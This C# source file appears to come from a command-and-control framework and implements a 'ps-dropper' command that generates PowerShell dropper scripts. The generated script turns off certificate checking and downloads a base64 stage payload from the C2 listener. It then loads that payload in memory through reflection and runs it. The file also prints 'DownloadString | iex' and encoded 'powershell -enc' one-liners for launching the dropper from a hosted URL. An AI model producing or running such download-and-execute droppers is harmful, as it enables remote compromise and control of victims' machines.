using Commander.Executor;
using System;
using System.CommandLine;
using System.CommandLine.NamingConventionBinder;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Commander.Internal;
using System.IO;

namespace Commander.Commands.Laucher
{
    public class BuildPSDropperCommandCommandOptions
    {

        public string listenerName { get; set; }

        public string fileName { get; set; }

        public bool x86 { get; set; }

        public bool raw { get; set; }

        public bool webhost { get; set; }

        public bool verbose { get; set; }
    }
    public class BuildPSDropperCommand : EnhancedCommand<BuildPSDropperCommandCommandOptions>
    {


        public override string Category => CommandCategory.Commander;
        public override string Description => "Create a Powershell dropper script";
        public override string Name => "ps-dropper";

        public override ExecutorMode AvaliableIn => ExecutorMode.Launcher;

        public override RootCommand Command => new RootCommand(this.Description)
        {
            new Argument<string>("listenerName", "name of the listener used"),
            new Option<string>(new[] { "--fileName", "-f" }, () => "dropper" ,"Nome of the file to be crafted"),
            new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
            new Option(new[] { "--raw", "-raw" }, "Don't base64 encode the payload"),
            new Option(new[] { "--webhost", "-wh" }, "Host the payload on the C2 Web Host"),
            new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
        };

        protected override async Task<bool> HandleCommand(CommandContext<BuildPSDropperCommandCommandOptions> context)
        {
            var listeners = context.CommModule.GetListeners();
            var listener = listeners.FirstOrDefault(l => l.Name.ToLower() == context.Options.listenerName.ToLower());

            if (listener == null)
            {
                context.Terminal.WriteLine($"No Listener named {context.Options.listenerName}");
                return false;
            }

            string protocol = "http";
            if (listener.Secured)
                protocol = "https";

            var dotnetparms = $"{protocol}:{listener.Ip}:{listener.PublicPort}";

            string outFile = context.Options.fileName;
            if (!Path.GetExtension(outFile).Equals(".ps1", StringComparison.OrdinalIgnoreCase))
                outFile += ".ps1";
            string outPath = Path.Combine("/tmp", outFile);

            var fileName = "Stage1";
            if (context.Options.x86)
                fileName += "-x86";
            fileName += ".b64";


            string script = string.Empty;
            if(listener.Secured)
                script += "add-type 'using System.Net;using System.Security.Cryptography.X509Certificates;public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}';[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy;";

            script += $"$b64 = (iwr \"{protocol}://{listener.Ip}:{listener.PublicPort}/{fileName}\" -UseBasicParsing).Content;";
            script += "$b = [System.Convert]::FromBase64String([System.Text.Encoding]::ASCII.GetString($b64));";
            script += "$a = [System.Reflection.Assembly]::Load($b);";
            script += "$m =  $a.GetTypes().Where({ $_.Name -eq 'Stage' }, 'First').GetMethod('Entry', [Reflection.BindingFlags] 'Static, Public, NonPublic');";
            script += $"$m.Invoke($null,  '{protocol}:{listener.Ip}:{listener.PublicPort}');";

            context.Terminal.WriteLine($"[>] Generating script...");

            var scriptb64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));

            if (context.Options.raw)
            File.WriteAllText(outPath, script);
            else
                File.WriteAllText(outPath, scriptb64);
            context.Terminal.WriteInfo($"Dropper can be found at {outPath}");
            if (context.Options.webhost)
            {
                byte[] fileContent = Encoding.UTF8.GetBytes(script);
                context.CommModule.WebHost(listener.Id, outFile, fileContent);



                string url = $"{protocol}://{listener.Ip}:{listener.PublicPort}/{outFile}";
                context.Terminal.WriteLine($"[*] dropper hosted on : {url}");

                context.Terminal.WriteLine($"[+] External Script : ");

                string caller = $"(New-Object Net.WebClient).DownloadString('{url}') | iex";
                if (listener.Secured)
                    caller = BuildDropperCommand.PowershellSSlScript + caller;
                context.Terminal.WriteLine($"[>] Command : powershell -c \"{caller}\"");
                string caller64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(caller));
                context.Terminal.WriteLine($"[>] Command : powershell -enc \"{caller64}\"");
            }

            context.Terminal.WriteLine($"[+] Direct Script : ");
            context.Terminal.WriteLine($"[>] Command : powershell -c \"{script}\"");
            context.Terminal.WriteLine($"[>] Command : powershell -enc {scriptb64}");

            return true;
        }
    }

}
